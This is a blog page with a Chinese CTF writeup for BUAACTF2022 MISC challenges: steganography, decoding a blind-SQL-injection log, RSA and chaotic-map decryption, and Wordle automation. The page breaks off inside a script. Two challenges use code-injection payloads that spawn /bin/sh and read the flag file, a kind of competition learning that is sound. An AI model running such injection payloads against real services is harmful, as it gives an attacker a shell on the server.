<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>BUAACTF2022题解 | ch3v4l's Blog</title><meta name="author" content="ch3v4l"><meta name="copyright" content="ch3v4l"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="BUAACTF2022 Writeup by ch3v4lMISCwelcome签到题 easy_game查看源码发现和crypto的ez_game逻辑几乎完全相同，只是在系统交互部分中ez_game传值使用的是socket.send，而本题使用的是input()，猜测此处会有漏洞。 源码中提示本题使用的是python2，搜索发现python2中的input()函数存在漏洞，可以直接拿到shell">
<meta property="og:type" content="article">
<meta property="og:title" content="BUAACTF2022题解">
<meta property="og:url" content="http://example.com/2023/04/19/BUAACTF2022%E9%A2%98%E8%A7%A3/index.html">
<meta property="og:site_name" content="ch3v4l&#39;s Blog">
<meta property="og:description" content="BUAACTF2022 Writeup by ch3v4lMISCwelcome签到题 easy_game查看源码发现和crypto的ez_game逻辑几乎完全相同，只是在系统交互部分中ez_game传值使用的是socket.send，而本题使用的是input()，猜测此处会有漏洞。 源码中提示本题使用的是python2，搜索发现python2中的input()函数存在漏洞，可以直接拿到shell">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://s2.loli.net/2023/04/19/KA3Cm4z7hWDncyk.png">
<meta property="article:published_time" content="2023-04-19T15:24:56.000Z">
<meta property="article:modified_time" content="2023-04-19T15:25:49.602Z">
<meta property="article:author" content="ch3v4l">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s2.loli.net/2023/04/19/KA3Cm4z7hWDncyk.png"><link rel="shortcut icon" href="/img/or4nge.png"><link rel="canonical" href="http://example.com/2023/04/19/BUAACTF2022%E9%A2%98%E8%A7%A3/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'BUAACTF2022题解',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-04-19 23:25:49'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="ch3v4l's Blog" type="application/atom+xml">
</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2023/04/19/cP5FvzqJkZ9SLAR.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s2.loli.net/2023/04/19/KA3Cm4z7hWDncyk.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">ch3v4l's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">BUAACTF2022题解</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-04-19T15:24:56.000Z" title="Created 2023-04-19 23:24:56">2023-04-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-04-19T15:25:49.602Z" title="Updated 2023-04-19 23:25:49">2023-04-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF-Writeups/">CTF-Writeups</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="BUAACTF2022题解"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="BUAACTF2022-Writeup-by-ch3v4l"><a href="#BUAACTF2022-Writeup-by-ch3v4l" class="headerlink" title="BUAACTF2022 Writeup by ch3v4l"></a>BUAACTF2022 Writeup by ch3v4l</h1><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="welcome"><a href="#welcome" class="headerlink" title="welcome"></a>welcome</h3><p>签到题</p>
<h3 id="easy-game"><a href="#easy-game" class="headerlink" title="easy_game"></a>easy_game</h3><p>查看源码发现和crypto的ez_game逻辑几乎完全相同，只是在系统交互部分中ez_game传值使用的是socket.send，而本题使用的是input()，猜测此处会有漏洞。</p>
<p>源码中提示本题使用的是python2，搜索发现python2中的input()函数存在漏洞，可以直接拿到shell：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43921239/article/details/108569794">https://blog.csdn.net/weixin_43921239/article/details/108569794</a></p>
<p>（其实初学python的时候看到过这个洞，结果忘了，想了好久）</p>
<p>因此连接端口，依次传入以下指令即可拿到flag：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__import__(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">find -name flag  <span class="comment">// ./home/ctf/flag</span></span><br><span class="line">cat ./home/ctf/flag</span><br></pre></td></tr></table></figure>
<h3 id="math-is-safe"><a href="#math-is-safe" class="headerlink" title="math is safe"></a>math is safe</h3><p>同样是端口题。下载题目文件得到环境配置文档和源码，查看dockerfile发现flag藏在flag.txt文件中，查看vuln.sage发现拿到flag需要先解决前面的问题，而前面的问题是给黎曼猜想找一个反例。。。</p>
<p>所以肯定不可能通过解决数学问题得到shell，需要利用sagemath库本身的代码逻辑漏洞。查看sagemath手册中对to_prec函数和round函数的解释，发现这两个函数在特殊传入时可能会出现精度缺失问题，因此最初想通过构造一个特殊精度的复数来绕过限制条件，但是一直没能成功。</p>
<p>询问出题人得到hint：查看github上的sage源码的记录文件。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/sagemath/sage/tree/develop/src/sage">https://github.com/sagemath/sage/tree/develop/src/sage</a></p>
<p>sagemath中to_prec函数位于complex_mpfr.pyx文档中，查询相关函数发现调用了global cache。查看历史记录时发现2021年10月25日有一个关于security risk的更新：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/sagemath/sage/commit/7dd78eff361f41195b54ec19fa139ddb5ff8d026">https://github.com/sagemath/sage/commit/7dd78eff361f41195b54ec19fa139ddb5ff8d026</a></p>
<p>发现CC库存在直接注入os指令控制shell的漏洞，因此连接端口注入指令即可得到flag。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">os.system(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">cat flag.txt</span><br></pre></td></tr></table></figure>
<h3 id="Who-is-he"><a href="#Who-is-he" class="headerlink" title="Who is he"></a>Who is he</h3><p>传统misc隐写题，一步一步走即可。</p>
<p>第一步：下载题目文件并解压，得到一张照片和Last Step文件夹。首先处理图片。图片上有一段base64编码，解码得到：ZIPKEY{we1c0me_t0_，猜测是某个加密压缩包的半段口令。在HexEditor中查看图片发现尾部有一个压缩包，利用binwalk分离压缩包发现其被加密，说明之前的压缩包口令可以用来破解。利用strings操作查看图片发现part2：BUAACTF}，拼到一起即可得到完整的压缩包密码。</p>
<p>第二步：压缩包中给出了一段奇怪的密码，提示让我们搜索和图片上人物相关的信息。百度识图发现图片上的是托马斯·杰斐逊，搜索编码相关内容发现是杰斐逊转轮加密。</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zs0618/p/12312558.html">https://www.cnblogs.com/zs0618/p/12312558.html</a></p>
<p>按照解密步骤解密转轮，发现转轮的列中出现BUAABUAABUAABUAA和PLAYMISCISSOOFUN等有意义字符，且都是16位，猜测使用了AES加密，给出的是iv和key，但需要找到加密模式。</p>
<p>第三步：查看Last Step文件夹中的两个hint文件，发现提示为QRcode和Illlinoyze的歌曲，在音乐软件中搜索Illinoyze发现其专辑中有歌曲名为AES，在评论区找到加密模式为CBC，列中的两段字符为iv和key。剩下的一个文件中给出了许多无意义的数字，发现总数为45，和九宫格形二维码的行列数相同，而二维码由黑白色素点构成，可看做一种二进制表示符号。因此将每行数字转为二进制后并补充至45位，利用PIL库拼接像素点得到一个二维码，扫描得到一段AES加密的base64。至此我们已经得到了密文，iv和key，解密即可得到flag。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">qr = <span class="string">&quot;111111100110001010010101010011100000101111111100000101001000100111011011111100101001000001101110100101110110110010000010000101001011101101110100111101111001100101100010001101011101101110100011010011101111100001100111101011101100000101001110001011000110100001000001000001111111101010101010101010101010101010101111111000000001110011100101000101010011011000000000000011110010010011101111111110001111001100010111010001011111101011111010001110101101110110001110110101000000011000100010110001110001110000100000101100011100110110001001100000000011000000100000110101000011000110101101010100011010110011001000001000001001011100101101111100010011100100101100011000111011100111101011100111000000011101101001011010111110100000100001101001111101111111100001000010101100000100001100000000110000110000001010111110101101001111011110111000101101000100111111010111111100110110000011100100111111001011100001011001100010000111111110010011111111111010101111111111111100010001110000101001000111100111000100010011001010101100110101111010110101001000101011010011010001000111111011000100110001101100010000110011111010111110001111110100101100111110011110101000101110100110011000100101100111101100011011110000101111000011011011000000100111110011011000111111101101000011011000100101101000001011110110001011001101111100001010001001001101011011001010011001101100000110101001100110011101110000000110010111000011010001010010110011001011000001110111000110000110010101000000010101111000010101110101101101101110001011010110110011110110111001101010101010101000100011000010111110000100011000111011000100010101110011110011010111110111011001000110100101010001100110110011110010001111110000001100111110010000000001100100001001000110011101001100011101111111101100000101011010100001110000101011010100000101001011010011000110000110110100010000101110101011110001001111111010001101111111111101110100101101010011110111111011100110111011101110100101011110001010111001101110010111010100000100100011000110111110111010100010010000111111100100011011111101110001001100111011101&quot;</span></span><br><span class="line">width, height = <span class="number">45</span>,<span class="number">45</span></span><br><span class="line">new_img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height))</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">if</span> qr[count] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            new_img.putpixel((w, h), (<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">        <span class="keyword">elif</span> qr[count] == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            new_img.putpixel((w, h), (<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">new_img.save(<span class="string">&#x27;qrcode.png&#x27;</span>)</span><br><span class="line">new_img.show()</span><br></pre></td></tr></table></figure>
<p><img src="D:\大二学习资料\CTF\BUAACTF\Who_is_he\Last Step\qrcode.png" alt="qrcode" style="zoom: 200%;" /></p>
<h3 id="sqlmisc2"><a href="#sqlmisc2" class="headerlink" title="sqlmisc2"></a>sqlmisc2</h3><p>下载题目文件得到一个数据库的access.log文件，用记事本打开得到完整的操作数据。将数据url解码后做代码审计发现admin在对数据库执行盲注，针对flag的具体注入逻辑出现在含有chart_db.flag的部分中。</p>
<p>注入代码的具体逻辑为：将chart_db.flag中的flag字符串的每个字符的ASCII进行十六进制编码（HEX）后转为七位二进制数（CONV2）后倒序输出，对于admin的每一次注入，若对应字符串注入为为1则注入成功，否则注入失败。在log文件中，若注入后数据库有回显则说明注入成功，否则说明注入失败。</p>
<p>因此，对于整个针对chart_db.flag的注入部分，可以直接根据每一次注入是否有回显判断字符串该位为0或1，编写脚本提取这一部分字符串并按注入处理规则还原回去即可。</p>
<p>还原回去发现字符串是倒置的，再倒置一次即可得到flag。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> findall</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s</span><br><span class="line"></span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;access.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        s.append(line)</span><br><span class="line">bit = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)-<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(s[i]) &gt; <span class="number">250</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">abs</span>(<span class="built_in">len</span>(s[i+<span class="number">1</span>])-<span class="built_in">len</span>(s[i])) &lt; <span class="number">5</span>:</span><br><span class="line">            bit += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            bit += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">bit = bit[::-<span class="number">1</span>]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(bit),<span class="number">7</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+bit[i:i+<span class="number">7</span>],<span class="number">2</span>))</span><br><span class="line">flag = flag[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<h3 id="Hello-visitor"><a href="#Hello-visitor" class="headerlink" title="Hello,visitor!"></a>Hello,visitor!</h3><p>解压文件得到A letter to the visitor.txt和flag.circ两个文件，txt文件中的第一段base64解码可得信件加密的基本信息，第二段base64转图片可得一张图片。</p>
<p><img src="D:\大二学习资料\CTF\BUAACTF\HelloVisitor\test.jpg" alt="test" style="zoom:67%;" /></p>
<p>利用Logisim文件打开flag.circ文件，分析电路发现是一个移位+rsa，对于每一位message，先把二进制扩展至64位再循环左移shifter位，最后扔进rsa加密。编写脚本解密即可，rsa的N不大，直接找网站分解即可，shifter没有给出，但是可以通过移位爆破还原。由于密钥是无意义字符，在爆破解密到密钥部分的时候有七八个“看着比较像”的结果。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s,invmod</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">move</span>(<span class="params">n,k</span>):</span><br><span class="line">    s = <span class="built_in">bin</span>(n)[<span class="number">2</span>:].zfill(<span class="number">64</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(s[k:] + s[:k], <span class="number">2</span>)</span><br><span class="line">    </span><br><span class="line">d = invmod(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>):</span><br><span class="line">    message[i] = <span class="built_in">pow</span>(message[i],d,p*q)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        <span class="built_in">print</span>(n2s(move(message[i],j))) <span class="comment"># 爆破找关键字</span></span><br></pre></td></tr></table></figure>
<p>编写解密脚本解出txt之后得到一个密钥。flag.jpg图片是一个被加密的图片且没有给出加密代码，在图片属性中查找发现备注X0=0.66 u=3.97，搜索资料可知使用的是Logistic加密（txt中也有提示），编写解密脚本即可（网上也有现成的，但是不保证所有解密脚本和我使用的都是一个模式，可能有非预期）。解密可得前半段flag。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logic_encrypt</span>(<span class="params">im, x0, mu</span>):</span><br><span class="line">    xsize, ysize = im.size</span><br><span class="line">    im = np.array(im).flatten()</span><br><span class="line">    num = <span class="built_in">len</span>(im)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        x0 = mu * x0 * (<span class="number">1</span>-x0)</span><br><span class="line">        </span><br><span class="line">    E = np.zeros(num)</span><br><span class="line">    E[<span class="number">0</span>] = x0</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,num-<span class="number">1</span>):</span><br><span class="line">        E[i+<span class="number">1</span>] = mu * E[i]* (<span class="number">1</span>-E[i])</span><br><span class="line">    E = np.<span class="built_in">round</span>(E*<span class="number">255</span>).astype(np.uint8)</span><br><span class="line"></span><br><span class="line">    im = np.bitwise_xor(E,im)</span><br><span class="line">    im = im.reshape(xsize,ysize,-<span class="number">1</span>)</span><br><span class="line">    im = np.squeeze(im)</span><br><span class="line">    im = Image.fromarray(im)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> im</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">img_hist</span>(<span class="params">im</span>):</span><br><span class="line">    im = np.array(im)</span><br><span class="line">    plt.hist(im.flatten(), bins = <span class="number">256</span>)</span><br><span class="line"></span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&quot;test.jpg&quot;</span>)</span><br><span class="line">x0 = <span class="number">0.66</span></span><br><span class="line">mu = <span class="number">3.97</span></span><br><span class="line"></span><br><span class="line">im_de = logic_encrypt(im, x0, mu)</span><br><span class="line">im_de.save(<span class="string">&#x27;flag.jpg&#x27;</span>)</span><br><span class="line">im_de.show()</span><br></pre></td></tr></table></figure>
<p><img src="D:\大二学习资料\CTF\BUAACTF\HelloVisitor\flag.jpg" alt="flag" style="zoom:67%;" /></p>
<p>此时密钥还没有使用，根据前半段猜测使用了隐写术，而letter中的where and how I <strong>hide</strong> the flag 提示了使用的是steghide工具，在linux上部署工具并解密即可得到后半段flag，拼起来即可。注意上面得到的七八种可能的密钥都要遍历试一试。</p>
<h3 id="Wordle-Revenge"><a href="#Wordle-Revenge" class="headerlink" title="Wordle Revenge"></a>Wordle Revenge</h3><p>原题来自于2月份举办的tqlctf中的MISC题目wordle，本质上是编写一个自动化破解wordle题目的脚本并远程交互执行，打通关即可得到flag。</p>
<p>本题中给出了部署代码，共需要解决两层问题，第一层问题是sha256的四层循环爆破，简单写一个暴力碰撞的脚本即可解决，第二层问题是wordle，需要选择难度并打通128关，难度0可以随意提交，难度1限制6步猜出，难度2限制5步猜出，难度3限制4步猜出。每种难度通关后会有相应的award。</p>
<p>针对wordle已有多种在线破解工具和脚本，本题采用的资料如下：<br>wordle自动破解脚本：<a target="_blank" rel="noopener" href="https://blog.hz2016.com/2022/02/miscwordle/">https://blog.hz2016.com/2022/02/miscwordle/</a></p>
<p>wordle破解原理及最少步数、开局词的选择：<a target="_blank" rel="noopener" href="https://github.com/3b1b/videos/tree/master/_2022/wordle">https://github.com/3b1b/videos/tree/master/_2022/wordle</a></p>
<p>解题脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span 